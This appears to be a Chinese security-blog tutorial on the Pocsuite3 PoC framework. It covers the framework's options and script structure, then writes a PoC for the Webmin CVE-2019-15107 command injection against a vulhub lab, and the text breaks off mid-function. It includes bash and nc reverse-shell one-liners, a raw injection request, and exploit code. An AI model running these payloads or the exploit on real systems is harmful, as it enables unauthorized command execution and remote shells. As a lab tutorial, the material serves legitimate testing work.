#  【POC开发系列01】Pocsuite3框架的使用与poc的编写   
原创 天欣  天欣安全实验室   2024-12-23 01:05  
  
   
  
# Pocsuite3的介绍  
  
Pocsuite3 是由  
知道创宇 404 实验室  
打造的一款基于 GPLv2 许可证开源的远程漏洞测试框架。Pocsuite3在编写时参考了很多市面上的开源框架以及流行成熟的框架，在**代码工程结构上参考了Sqlmap**  
，**Pocsuite-console模式则参照了routersploit与metasploit**  
，自2015年开源以来，不断更新迭代，保障了我们的 Web 安全研究能力的领先。  
  
  
官网:https://pocsuite.org/guide/what-is-pocsuite3.html  
  
  
其他文档推荐：https://paper.seebug.org/904/  
# 功能特性介绍  
## 漏洞测试框架  
  
Pocsuite3 采用 Python3 编写，支持**验证**  
，**利用**  
及 **shell**  
 三种模式，你可以指定单个目标或者从文件导入多个目标，使用单个 PoC 或者 PoC 集合进行漏洞的验证或利用。可以使用命令行模式进行调用，也支持类似 Metasploit 的交互模式进行处理，除此之外，还包含了一些基本的如输出结果报告等功能。  
## PoC/Exp 开发包  
  
Pocsuite3 也是一个 PoC/Exp 的 SDK，也就是开发包，我们封装了基础的 PoC 类，以及一些常用的方法，比如 Webshell 的相关方法，基于 Pocsuite3 进行 PoC/Exp 的开发，**你可以只要编写最核心的漏洞验证部分代码，而不用去关心整体的结果输出等其他一些处理。基于 Pocsuite3 编写的 PoC/Exp 可以直接被 Pocsuite3 使用，****Seebug**  
 网  
站也有几千个基于 Pocsuite3 的 PoC/Exp。  
## 可被集成模块  
  
Pocsuite3 除了本身直接就是一个安全工具外，也可以作为一个 Python 包被集成进漏洞测试模块。你还可以基于 Pocsuite3 开发你自己的应用，我们在 Pocsuite3 里封装了可以被其他程序 import 的 PoC 调用类，你可以基于 Pocsuite3 进行二次开发，调用 Pocsuite3 开发你自己的漏洞验证工具。  
## 集成多个安全服务的API  
  
Pocsuite3 还集成了 ZoomEye、Seebug、Ceye 、Shodan 等众多安全服务的 API，通过该功能，你可以通过 ZoomEye API 批量获取指定条件的测试目标（通过 ZoomEye 的 Dork 进行搜索），同时通过 Seebug API 读取指定组件或者类型的漏洞的 PoC 或者本地 PoC，进行自动化的批量测试，利用 Ceye 验证盲打的 DNS 和 HTTP 请求。  
## 一些特性  
- • 支持 verify、attack、shell 三种模式，不仅为扫描而生，也可用于其他场景，比如漏洞利用、获取目标的交互式 shell  
  
- • 从任何地方动态加载 PoC 脚本（本地文件、redis、数据库、Seebug...）  
  
- • 从任何地方加载目标（CIDR、本地文件、redis、数据库、ZoomEye...）  
  
- • 结果可以轻松导出  
  
- • 插件系统，用户可自定义 TARGETS、POCS、RESULTS 类型插件，可拓展性强  
  
- • 动态 hook urllib3、requests，方便 PoC 编写及全局控制  
  
- • 既可以当成一个命令行工具使用，也可以当成 Python 模块导入  
  
- • IPv4/IPv6 支持  
  
- • 全局 HTTP/HTTPS/SOCKS 代理支持  
  
- • 支持 YAML 格式 PoC，与   
nuclei  
 的 PoC 模版兼容  
  
- • 集成   
Seebug  
 (通过 Seebug API 读取指定组件或者类型的漏洞的 PoC)  
  
- • 集成   
ZoomEye  
、  
Shodan  
 等网络空间搜索引擎 (通过 API 批量获取测试目标)  
  
- • 集成   
Ceye  
、  
Interactsh  
 (DNSLog 盲打平台)  
  
- • 业界良心，代码全开源  
  
- • 更多...  
  
和 Metasploit 相比，Pocsuite3 目前不具有后渗透阶段的能力，比较轻量级。而相比于 YAML 格式的 PoC 框架，Pocsuite3 更加灵活，可以直接使用大量的第三方库，用户只要会写 Python，就能快速上手。  
  
从 2.0.0  
 版本开始，  
**Pocsuite3 支持 YAML 格式的 PoC，兼容 nuclei，可以直接使用**   
nuclei template。  
# 安装方法  
  
Pocsuite3 基于 Python3 开发，可以运行在支持 Python 3.7+ 的任何平台上，例如 Linux、Windows、MacOS、BSD 等。  
  
这里只列举windows系统下通过pip安装以及源码安装的方法，其他系统或者环境请查看官网。  
## 使用 Python3 pip 安装  
  
这里pip安装的一定要是**pocsuite3而不是pocsuite哦**  
```
pip3 install pocsuite3# 使用国内镜像加速pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pocsuite3
```  
## 通过Github的源码下载  
  
访问以下链  
接，下载后解压即可。  
  
https://github.com/knownsec/pocsuite3  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AyVFGmKalNwrrP6ib8V76Ij0gOZ43NTfLVXkFoPibwTSgVxqZLB1WMq7ZrfxLSMiaib2F7EjpEh9ryB5Pycoe07Cbg/640?wx_fmt=png&from=appmsg "null")  
  
  
cli.py  
和console.py  
就是我们的主要运行文件，分别对应了两种模式：命令行和交互式  
# 架构简析  
  
**整体而言，本框架主要包含四个部分，分别是目标收集、PoC 脚本加载、多线程检测、结果汇总。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AyVFGmKalNwrrP6ib8V76Ij0gOZ43NTfLx2Y5a9oeic7znpEsOtFN6P3yOgicM0Ws19yy39OOSVR7nqMPMMB0ib8dg/640?wx_fmt=png&from=appmsg "null")  
  
  
**这张架构简析的图片里面列出了很多的工具常用且重要的参数，大家要多看看哦！**  
# 运行方式  
  
Pocsuite3 有三种运行方法，1、命令行；2、交互式控制台；3、集成调用。  
## 命令行运行  
### 通过pip安装的情况  
  
直接在cmd运行 pocsuite 命令例如:pocsuite -r poc.py -u xxx.com  
，也可以将参数定义在 pocsuite3.ini 文件中，然后使用 pocsuite -c pocsuite.ini   
运行。  
### 通过源码安装的情况  
  
在解压好的目录中的/pocsuite3  
目录下，运行python cli.py -r poc.py 其他参数**，其实就是把**pocsuite**改为了**python cli.py  
  
以下是 官网中对于Pocsuite 工具的更全面和详细的命令行参数列表：  
  
https://pocsuite.org/guide/parameter-pocsuite.html#%E7%9B%AE%E6%A0%87%E5%8A%A0%E8%BD%BD  
### 目标加载  
- • -u  
 或 --url  
：加载单个 URL 或 CIDR，支持 IPv4/IPv6。  
  
- • -f  
 或 --file  
：从文件中加载多个 URL 或 CIDR。每行一个。如果遇到以 # 开头的行，会跳过该行。  
  
- • -p  
 或 --ports  
：为 URL 或 CIDR 添加额外端口，格式：[协议:]端口  
, 协议是可选的，多个端口间以 , 分隔。例如：pocsuite -r poc.py -u 172.16.218.1/31 -p 8080,https:8443  
  
- • -s  
：不加载 target 本身的端口，只使用 -p  
 提供的端口。例如：pocsuite -r poc.py -u 172.16.218.1/31 -p 8080,https:8443  
  
- • --dork-hunter / --hunter-token  
：通过 Hunter API 批量获取测试目标。  
  
- • 首次使用会提示输入 Hunter API key，验证可用后会保存到 $HOME/.pocsuiterc 文件中，除非 token 过期，下次使用不会重复询问，也可使用 --hunter-token 参数提供。单页检索数量为 20。  
  
- • --dork-fofa / --fofa-user / --fofa-token  
：通过 Fofa API 批量获取测试目标。  
  
- • 首次使用会提示输入 Fofa user email 和 Fofa API Key，验证可用后会保存到 $HOME/.pocsuiterc 文件中，除非 token 过期，下次使用不会重复询问，也可使用 --fofa-user 和 --fofa-token 参数提供。单页检索数量为 100。  
  
除了hunter之外还支持很多空间搜索引擎，比如：Quake 、Shodan等等，他们都有自己的参数，试用逻辑都是一致的，大家课后多看看官网。  
### PoC 脚本加载  
- • -r  
 或 --poc  
：指定 PoC 脚本文件或脚本目录。指定一个或多个 PoC 路径（或目录），如果提供的是目录，框架将遍历目录然后加载所有符合条件的 PoC。多个路径或目录之间用空格分隔。  
  
- • -k  
：指定关键词（支持正则）对 PoC 进行筛选，如组件名称、CVE 编号等。如果我们确认了目标组件，就可以用 -k 选项找到所有  
对应的 PoC 对目标进行批量测试。如果只提供了 -k 选项，-r 默认为 Pocsuite3 自带的 pocsuite3/pocs  
 目录。  
  
### 运行控制  
- • --verify  
：仅执行验证模式。执行 PoC 脚本的 _verify() 方法， 进行漏洞验证。（该模式为默认模式）  
  
- • --attack  
：仅执行攻击模式。攻击模式，执行 PoC 脚本的 _attack() 方法，具体表现取决于方法的实现。  
  
- • --pcap  
：可以将通信流量保存为 pcap 文件。后续可通过wireshark打开做流量分析。  
  
- • --shell  
：启用交互式 shell。shell 模式，执行 PoC 脚本的 _shell() 方法，控制台会进入 shell 交互模式执行命令及获取输出。  
  
Pocsuite3 在 shell 模式会默认监听本机的 6666 端（可通过 --lhost、--lport 修改），编写对应的攻击代码，让目标执行反向连接运行 Pocsuite3 系统 IP 的 6666 端口即可得到一个 shell。  
  
如果要启用 TLS 监听器（如 openssl 的反连 shell），可使用 --tls 参数。  
- • --threads  
：设置线程数。默认为 Min(150, 目标总数)  
。  
  
### 网络控制  
- • --proxy  
：设置代理。全局 HTTP/HTTPS/SOCKS 代理，支持的协议类型有：http、https、socks4、socks5、socks5h。例如：pocsuite -r poc.py -u xxx.com --proxy socks5://127.0.0.1:9150  
如果代理需要认证，可使用参数 --proxy-cred name:password 提供。  
  
- • --session-reuse  
：启用 session 重用  
  
其他网络请求控制选项还有：--cookie、--host、--referer、--retry、--delay、--headers，此处不再一一赘述。  
### DNSLog 服务  
- • --ceye-token  
：通过 CEye API 辅助验证盲打 HTTP/DNS 请求。  
  
首次使用会提示输入 CEye API key，验证可用后会保存到 $HOME/.pocsuiterc 文件中，除非 token 过期，下次使用不会重复询问，也可使用 --ceye-token 参数提供。  
  
（其他请查看官网）  
### Web Hook  
  
扫描完成使用 钉钉 和 企业微信 进行通知  
  
--dingtalk-token  
  
钉钉的 token  
  
--dingtalk-secret  
  
钉钉的 secret  
  
--wx-work-key  
  
企业微信的 Web Hook key  
### 结果汇总  
- • --json-output  
：以 JSON 格式输出结果。  
  
- • -v / --ppt  
：控制台日志获取结果，-v 用于控制日志等级，--ppt 可以将 IP 地址马赛克处理，方便录屏。如下：  
  
```
pocsuite -k ecshop -u127.0.0.1-v2--ppt...[17:47:51] [INFO] loading PoC script 'pocsuite3/pocs/ecshop_rce.py'[17:47:51] [INFO] pocsusite got a total of 1 tasks[17:47:51] [DEBUG] pocsuite will open 1 threads[17:47:51] [INFO] running poc:'Ecshop 2.x/3.x Remote Code Execution' target '*.*.0.1'[17:47:54] [INFO] Scan completed,ready to print+------------+--------------------------------------+--------+-----------+---------+--------+| target-url |               poc-name               | poc-id | component | version | status |+------------+--------------------------------------+--------+-----------+---------+--------+| *.*.0.1    | Ecshop 2.x/3.x Remote Code Execution | 97343  |   ECSHOP  | 2.x,3.x | failed |+------------+--------------------------------------+--------+-----------+---------+--------+success : 0 / 1...
```  
- • -o / --output  
：将结果保存为 JSON Lines 格式文件。  
  
### 自定义的参数  
- • --args  
：为 PoC 脚本提供自定义参数。有的 PoC 脚本需要填写登录信息，或者任意命令执行时执行用户指定的命令。可在 PoC 中自定义参数，可参见：  
可自定义参数的 PoC  
  
使用 --optioins 参数可以很方便的查看某 PoC 的自定义参数信息，如下：  
```
pocsuite -k ecshop --options[17:27:24] [INFO] loading PoC script '**/lib/python3.9/site-packages/pocsuite3-1.9.6-py3.9.egg/pocsuite3/pocs/ecshop_rce.py'Module (pocs_ecshop_rce) options:+-------------+------------------------------------------+--------+--------------------------------------------------------------------------+|     Name    |             Current settings             |  Type  |                               Description                                |+-------------+------------------------------------------+--------+--------------------------------------------------------------------------+|   command   |                  whoami                  | String |                             攻击时自定义命令                             || app_version |                   Auto                   | Select |                           目标版本，可自动匹配                           ||   payload   | bash -c'sh -i >& /dev/tcp/{0}/{1} 0>&1' |  Dict  | nc:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i2>&1|nc {0} {1} >/tmp/f ||             |                                          |        |              bash:bash -c'sh -i >& /dev/tcp/{0}/{1} 0>&1'               ||             |                                          |        |                                                                          ||             |                                          |        |          You can select dict_keys(['nc', 'bash']) ,default:bash          |+-------------+------------------------------------------+--------+--------------------------------------------------------------------------+[*] shutting down at 17:27:24
```  
### 其他  
- • -n / --new  
：生成 PoC 模版。详情可见：  
实战poc开发  
  
- • -c  
：通过配置文件提供所有参数。详情可见：  
pocsuite.ini 配置文件参数说明  
，pocsuite.ini文件的默认存放位置如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AyVFGmKalNwrrP6ib8V76Ij0gOZ43NTfL0Yw2jVfRcFgSsJ5gbRpyb6Bx9fKbFv0YhGR6Zu6uANzZUYM1RVBW7g/640?wx_fmt=png&from=appmsg "null")  
  
- • --plugins  
：加载执行自定义的插件，详情可见：  
插件编写  
  
这些参数提供了对 Pocsuite 工具的全面控制，包括目标加载、脚本执行、网络配置、输出格式等多个方面。更多详细信息和使用示例，请参考   
Pocsuite 官方文档  
。  
  
- • --no-check  
：禁用 URL HTTP/HTTPS 协议自动纠正和蜜罐检查。  
  
## 控制台运行  
### 通过pip安装的情况  
  
使用命令 poc-console  
 进入  
交互式控制台后，可通过 help 命令查看帮助，list 或 show all 列出所有 PoC 模块，use 加载某指定模块。相关参数可通过 set / setg 命令设置。 （**特别类似MSF**  
）  
### 通过源码安装的情况  
  
通过在解压后的目录中运行：python console.py  
 即可进入交互模式  
## 集成调用  
  
Pocsuite3 api 提供了集成调用 pocsuite3 的全部功能函数，可参见测试用例 tests/test_import_pocsuite_execute.py  
。  
# Pocsuite的poc脚本编写规范  
  
在 Pocsuite3 中，PoC 脚本有三种运行模式，分别为：  
1. 1. verify  
 模式，验证漏洞存在。验证方式取决于具体的漏洞类型，比如检查目标的软件版本、判断某个关键 API 的状态码或返回、读取特定文件、执行一个命令并获取结果，结合 DNSLog 带外回显等。该模式用于批量漏洞排查，一般不需要用户提供额外参数 ，且应尽可能对目标无害。  
  
1. 2. attack  
 模式，攻击模式，可实现某种特定需求。比如获取特定数据、写入一句话并返回 shell 地址、从命令行参数获取命令并执行、从命令行参数获取文件路径并返回文件内容等。  
  
1. 3. shell  
 模式，获取交互式 shell，此模式下会默认监听本机的 6666 端口（可通过 --lhost、--lport 参数修改），编写对应的代码，让目标执行反连 Payload 反向连接到设定的 IP 和端口即可得到一个 shell。  
  
**上面三种模式其实对应了下文中poc编写时的三个函数：**_verify**、**_attack**、**_shell  
# Poc的脚本编写步骤  
  
官网详细介绍：  
  
https://pocsuite.org/guide/poc-script-write.html#%E4%BB%8E-0-%E5%88%B0-1  
  
tips：一个好的poc离不开不断的测试和调试  
## 自定义编写poc脚本  
### 1.新建一个 *.py 文件，文件名最好符合Poc 命名格式（不强求）  
> Poc 命名格式：_编号_漏洞应用名_版本号_漏洞类型名称（这些编号，应用名字都可以自定义），然后把文件名称中的所有字母改成小写，所有的符号改成 _。 文件名不能有特殊字符和大写字母，最后出来的文件名应该像这样：  
> **_1847_seeyon_3_1_login_info_disclosure.py**  
  
### 2.从 pocsuite3.api 导入待用的类和方法，编写 PoC 实现类 DemoPOC，继承自 PoCBase 类。  
```
from pocsuite3.api import (    minimum_version_required, POCBase, register_poc, requests, logger,    OptString, OrderedDict,    random_str,    get_listener_ip, get_listener_port, REVERSE_PAYLOAD)class DemoPOC(POCBase):    ... #后续代码
```  
  
POCBase  
是pocsuite3的一个**基类**  
，很多共用的属性和方法都可以放到此基类中。我们编写 PoC 时，只需要继承该基类就可，大家可以通过查看并修改源码来使其自定义化。  
  
以下的方法和属性如无特殊说明，都写在DemoPOC类(自定义的继承POCBase的类)里面。  
### 3.导入模块、创建好类之后，填写 以下的PoC 信息字段（这些字段都不是必须的，也可留空）  
```
from pocsuite3.api import Output, POCBase, register_poc, requests, loggerfrom pocsuite3.api import get_listener_ip, get_listener_portfrom pocsuite3.api import REVERSE_PAYLOAD, random_strclassDemoPOC(POCBase):    vulID = '99335'# Seebug 漏洞收录 ID，如果没有则为 0    version = '1'# PoC 的版本，默认为 1    author = 'seebug'# PoC 的作者    vulDate = '2021-8-18'# 漏洞公开日期 (%Y-%m-%d)    createDate = '2021-8-20'# PoC 编写日期 (%Y-%m-%d)    updateDate = '2021-8-20'# PoC 更新日期 (%Y-%m-%d)    references = ['https://www.seebug.org/vuldb/ssvid-99335']  # 漏洞来源地址，0day 不用写    name = 'Fortinet FortiWeb 授权命令执行 (CVE-2021-22123)'# PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>    appPowerLink = 'https://www.fortinet.com'# 漏洞厂商主页地址    appName = 'FortiWeb'# 漏洞应用名称    appVersion = '<=6.4.0'# 漏洞影响版本    vulType = 'Code Execution'# 漏洞类型，参见漏洞类型规范表    desc = '/api/v2.0/user/remoteserver.saml接口的name参数存在命令注入'# 漏洞简要描述    samples = ['http://192.168.1.1']  # 测试样列，就是用 PoC 测试成功的目标    install_requires = ['BeautifulSoup4:bs4']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写    # 如果遇到安装时模块名与调用时的不一致情况，用 : 分割开    pocDesc = ''' poc的用法描述 '''    category = POC_CATEGORY.EXPLOITS.WEBAPP  # PoC 的分类    protocol = POC_CATEGORY.PROTOCOL.HTTP  # PoC 的默认协议，方便对 url 格式化    protocol_default_port = 8443# 目标的默认端口，当提供的目标不包含端口的时候，方便对 url 格式化    dork = {'zoomeye': 'deviceState.admin.hostname'}  # 搜索 dork，如果运行 PoC 时不提供目标且该字段不为空，将会调用插件从搜索引擎获取目标。    suricata_request = '''http.uri; content: "/api/v2.0/user/remoteserver.saml";'''# 请求流量 suricata 规则    suricata_response = ''  # 响应流量 suricata 规则 
```  
### 4.编写发送payload到服务器的代码，也就是_exploit函数的代码：  
  
以下的_exploit  
仅作为示例演示，至于返回结果和代码逻辑都可以进行高度自定义。  
```
# 完全由你重写这个方法def _exploit(self, cmd='whoami'):    result = ''    payload=f'xxxxxxyyyyyyy{cmd}nnnnnnn'    #这里的self.url就是POCBase基类的属性    res = requests.post(self.url,data=payload)    logger.debug(res.text)    result = res.text    return result
```  
  
针对有回显的漏洞，只要在 PoC 中实现一个 _exploit  
 方法，就可轻松实现 Pocsuite3 的 _verify  
、_attack  
、_shell  
 三种模式，因为这些模式对应的函数里面发送payload的方法都默认是由_exploit 函数实现的。  
### 5.编写验证模式代码，也就是_verify函数的代码 （该函数最后要返回一个output对象）  
  
官方建议在_verify  
函数当中，使用PoCBase 中的 parse_output()  
通用结果处理函数对 _verify  
 和 _attack   
结果进行返回，而parse_output()  
函数接受一个字典作为参数，如果字典不为空则代表漏洞验证/攻击成功，所以大家写poc时，**确保漏洞验证成功后，再给结果字典赋值并传递给**parse_output()**做结果解析并输出。**  
```
def _verify(self, verify=True):    result = {}    res=_exploit(self)    #返回包内容匹配    #...    #结果输出    if 漏洞验证条件:        # 返回漏洞验证成功的网站的信息        result['VerifyInfo'] = {}        result['VerifyInfo']['URL'] = self.url    return self.parse_output(result)
```  
  
**result是存储结果的字典，其字典的不同的key值代表了不同的含义，具体详细的详细请看官网的描述：**  
  
https://pocsuite.org/guide/poc-specification.html#poc-%E7%BB%93%E6%9E%9C%E8%BF%94%E5%9B%9E%E8%A7%84%E8%8C%83  
### 6.编写攻击模式的代码，也就是_attack函数。  
  
攻击模式可以对目标进行 getshell，查询管理员账  
号密码等操作，  
**定义它的方法与验证模式类似**  
，完全由我们自定义攻击逻辑。**return返回的结果也和验证模式一样，攻击成功后需要把攻击得到结果赋值给 result 变量并调用 self.parse_output(result)返回结果。**  
```
def _attack(self):    output = Output(self)    result = {}    # 攻击代码    res=_exploit(self,cmd='ppppp')    # 返回包内容匹配    #...    # 结果输出    if 漏洞攻击成功验证条件:        # 返回数据库管理员密码        result['DBInfo'] = {}        result['DBInfo']['Password']='xxxxx'        # 返回 Webshell 地址        result['ShellInfo'] = {}        result['ShellInfo']['URL'] = 'xxxxx'        # 返回网站管理员用户名        result['AdminInfo'] = {}        result['AdminInfo']['Username']='xxxxx'     returnself.parse_output(result)
```  
  
如果该 PoC 没有攻击模式，可以在 _attack()  
 函数下加入一句 return self._verify()  
 这样你就无需再写 _attack() 函数了，如下所示。  
```
def _attack(self):    return self._verify()
```  
### 7.编写shell模式的代码，也就是_shell函数  
  
如果没有shell模式则同理可以在 _shell()  
 函数下加入一句 return self._verify()  
  
Pocsuite3 在 shell 模式会默认监听本地127.0.0.1的 **6666**  
 端口，编写对应的攻击代码**(一般就是反弹shell的命令，可以用框架本身提供的，也可以自己写)**，让目标执行反向连接运行 Pocsuite3 系统 IP 的 6666 端口即可得到一个 shell。shell 模式下，只能运行单个 PoC 脚本，控制台会进入 shell 交互模式执行命令及输出。  
```
def _shell(self):    cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())    # 攻击代码 execute cmd    self._exploit(cmd)
```  
  
Pocsuite3 支持加密的 shell。PoC 中使用 openssl 的反弹命令（也可以用代码反弹），并且在运行时指定 --tls 选项。该框架除了反弹shell之外还支持bind shell，具体方法请看官方  
  
**（其实用pocsuite3做后渗透并不太友好，我们主要还是利用其poc的快捷编写以及批量扫描功能）**  
### 8.最后，在DemoPOC类外，通过register_poc()注册poc。（比较简单，一句话的事情）：  
```
register_poc(DemoPOC)
```  
  
以上的方法略微繁琐，所以Pocsuite3框架也给我们提供了快捷生成poc的方法，那就是使用参数-n  
 或 --new  
 参数自动生成 PoC 模版。  
## 通过框架快速自动生成poc模板  
  
**运行：**python cli.py -n  
 或者 **pocsuite -n**  
 来进入快速生成poc模板的模式，如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AyVFGmKalNwrrP6ib8V76Ij0gOZ43NTfLEMlqGX8TyKekCFEZOzoTTtvibmVqxiciaHkpftdrZ9qkMxtUOobibbtfxA/640?wx_fmt=png&from=appmsg "null")  
  
  
运行命令后，会提示我们输入一些poc相关的信息，我们输入完成后即可生成一个poc的模板。（如果嫌属性比较多，一路回车即可），以下是需要我们运行-n  
参数后提示的输入信息含义：  
```
Seebug ssvid (eg, 99335) [0]:  Seebug 漏洞编号（例如，99335）[0]：  PoC author (eg, Seebug) []:  PoC 作者（例如，Seebug）[]：  Vulnerability disclosure date (eg, 2021-8-18) [2024-12-21]:  漏洞披露日期（例如，2021-8-18）[2024-12-21]：  Advisory URL (eg, https://www.seebug.org/vuldb/ssvid-99335) []:  公告链接（例如，https://www.seebug.org/vuldb/ssvid-99335）[]：  Vulnerability CVE number (eg, CVE-2021-22123) []:  漏洞 CVE 编号（例如，CVE-2021-22123）[]：  Vendor name (eg, Fortinet) []:  厂商名称（例如，Fortinet）[]：  Product or component name (eg, FortiWeb) []:  产品或组件名称（例如，FortiWeb）[]：  Affected version (eg, <=6.4.0) []:  受影响版本（例如，<=6.4.0）[]：  Vendor homepage (eg, https://www.fortinet.com) []:  厂商主页（例如，https://www.fortinet.com）[]：  0    Arbitrary File Read:  任意文件读取  1    Code Execution:  代码执行  2    Command Execution:  命令执行  3    Denial Of Service:  拒绝服务  4    Information Disclosure:  信息泄露  5    Login Bypass:  登录绕过  6    Path Traversal:  路径遍历  7    SQL Injection:  SQL 注入  8    SSRF:  服务器端请求伪造  9    XSS:  跨站脚本攻击  Vulnerability type, choose from above or provide (eg, 3) []:  漏洞类型，从上述选项中选择或自行提供（例如，3）[]：  Authentication Required (eg, yes) [no]:  是否需要认证（例如，yes）[no]：  PoC name [Pre-Auth Other]:  PoC 名称 [Pre-Auth Other]：  Filepath in which to save the poc [./20241221_pre-auth_other.py]:  保存 PoC 的文件路径 [./20241221_pre-auth_other.py]：  
```  
## 最简化的poc  
  
基类 POCBase 为 PoC 的所有属性设置了默认值，写 PoC 时可以不写任何属性字段，简化 PoC 的开发。  
```
from pocsuite3.api import *class TestPOC(POCBase):    # 为了 PoC 的区分，建议提供 name 属性    # name = ''    def _verify(self):        result = {}        # 自定义payload和验证代码        return self.parse_output(result) #返回output对象# 注册pocregister_poc(TestPOC)
```  
# 自定义参数的poc  
  
如果你需要编写一个可以交互参数的 PoC 文件（例如有的 PoC 脚本需要填写登录信息，或者任意命令执行时执行任意命令），那么可以在 PoC 文件的DemoPOC  
类中声明一个 _options  
 方法并且让其**返回一个自定义参数的有序字典**  
。  
```
# 以下是attack 模式定义额外的命令行参数的例子def_options(self):    o = OrderedDict() #于生成并返回一个包含选项的有序字典（OrderedDict）    #    o['cmd'] = OptString('uname -a', description='The command to execute')    # OptString：这是一个自定义的字符串选项类，用于表示一个字符串类型的选项。    # 'uname -a'：这是传递给 OptString 的默认值，表示一个要在 Unix 系统上执行的命令，用于显示系统的详细信息。    # description='The command to execute'：这是对选项的描述，说明这个选项是用来执行命令的。    # 在cmd窗口下可以添加--cmd参数来指定要执行的命令。    return o #返回这个参数字典#另一个例子：def_options(self):    o = OrderedDict()    o["username"] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=True)    o["password"] = OptString('', description='这个poc需要用户密码，请输出用户密码', require=False)    return o# 通过self.get_option(key值)来获取自定义参数def_verify(self):    result = {}    payload = "username={0}&password={1}".format(self.get_option("username"), self.get_option("password"))    r = requests.post(self.url, data=payload)    if r.status_code == 200:        result['VerifyInfo'] = {}        result['VerifyInfo']['URL'] = self.url        result['VerifyInfo']['Postdata'] = payload    returnself.parse_output(result)
```  
- • 在 console 模式下，Pocsuite3 模仿了 Metasploit 的操作模式，你只需要使用 set 命令来设置相应的参数，然后 run 或者 check 来执行（attack 和 shell 命令也可以）。  
  
- • 在 cli 模式下，如上面第二个例子所示，定义了 username 和 password 两个字段，你可以在参数后面加上 --username test --password test 来调用执行，需要注意的是，如果你的参数中包含了空格，用双引号 " 来包裹它。  
  
**自定义参数的数据传入类型除了OptString之外还有OptDict、OptIP、OptBool等，详情请看官网：**  
  
https://pocsuite.org/guide/poc-definition-options.html#%E6%94%AF%E6%8C%81%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AD%97%E6%AE%B5%E7%B1%BB%E5%9E%8B  
  
**总结：通过**_options  
**方法自定义传参后，需要使用方法**self.get_option()  
**来获取自定义参数**  
# Poc开发的注意事项：  
  
以下截图来自于官网：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AyVFGmKalNwrrP6ib8V76Ij0gOZ43NTfL8kzJMX27SwIdZxBudTQt7cpLqfMGf1VicuDicibRv5d9DPm2CTEic5qLow/640?wx_fmt=png&from=appmsg "null")  
  
  
**更多注意事项请看官网：**  
  
https://pocsuite.org/guide/poc-write-notice.html  
# pocsuite3的Poc脚本开发实战案例  
  
我们拿官网讲到的 Webmin 未授权远程命令执行漏洞（CVE-2019-15107）来做一个详细的讲解。  
## vulhub启动靶场  
  
在 vulhub-master/webmin/CVE-2019-15107 路径下打开终端，依次输入以下命令（需要安装docker和下载vulhub）：  
```
sudo service docker start sudo docker-compose build sudo docker-compose up -d 
```  
  
然后用https打开虚拟机ip:10000,如下所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AyVFGmKalNwrrP6ib8V76Ij0gOZ43NTfLSUMibJDZRaXJSiaRmHlNmk9tibog2e286qhhScZt9sMuVDLW2FgL1NEuA/640?wx_fmt=png&from=appmsg "null")  
  
  
抓登录的包,将登录包的路径换位/password_change.cgi ，将data设置为：user=12&pam=333&expired=2&old=ls&new1=1111&new2=1111  
   
  
其中old后面接的就是本地所执行的命令。  
```
POST /password_change.cgiHTTP/1.1Host: 192.168.34.132:10000Cookie: redirect=1; testing=1Content-Length: 44Cache-Control: max-age=0Sec-Ch-Ua: "Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"Sec-Ch-Ua-Mobile: ?0Sec-Ch-Ua-Platform: "Windows"Origin: https://192.168.34.132:10000Content-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: same-originSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentReferer: https://192.168.34.132:10000/session_login.cgiAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Priority: u=0, iConnection: keep-aliveuser=12&&old=whoami&new1=1111&new2=1111
```  
  
poc请求执行效果如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/AyVFGmKalNwrrP6ib8V76Ij0gOZ43NTfLzAy3zgYBRlJNaSaGUiciaExJlEw2SdWicZebmoFPI9wa6pzvc9oQic1Qog/640?wx_fmt=png&from=appmsg "null")  
  
## Pocsuite3的poc脚本如下：  
```
from pocsuite3.api import (    minimum_version_required, POCBase, register_poc, requests, logger,    OptString, OrderedDict,    random_str,    get_listener_ip, get_listener_port, REVERSE_PAYLOAD)import reclassDemoPOC(POCBase):    vulID = 's01'# Seebug 漏洞收录 ID，如果没有则为 0    version = '1'# PoC 的版本，默认为 1    author = 'skyx'# PoC 的作者    name = 'webmin命令执行'# PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>    appName = 'Webmin'# 漏洞应用名称    appVersion = '<=1.920'# 漏洞影响版本    vulType = 'Code Execution'# 漏洞类型，参见漏洞类型规范表    desc = 'webmin<=1.920版本存在命令执行'# 漏洞简要描述    pocDesc = ''' 先使用verify模式直接运行验证漏洞是否存在，再attack模式使用--cmd 参数可以达到任意命令执行的效果  '''    def_exploit(self, param=''):        ifnotself._check(dork='<title>Login to Webmin</title>'):            #只对网站返回包中包含<title>Login to Webmin</title>的站点进行poc测试            returnFalse        headers = {            'Content-Type': 'application/x-www-form-urlencoded',            'Referer': f'{self.url}/session_login.cgi'        }        # 构造payload        payload = f'user=rootxx&pam=&expired=2&old=test|{param}&new1=test2&new2=test2'        # 发送post请求，在对应路径发送payload拿到响应包        res = requests.post(f'{self.url}/password_change.cgi', headers=headers, data=payload)        logger.debug(res.text)        return res.text.split('The current password is incorrect')[-1].split('</h3></center>')[0]    def_verify(self):        result = {}        flag = random_str(6)        param = f'echo {flag}'        res = self._exploit(param)        if res and flag in res:            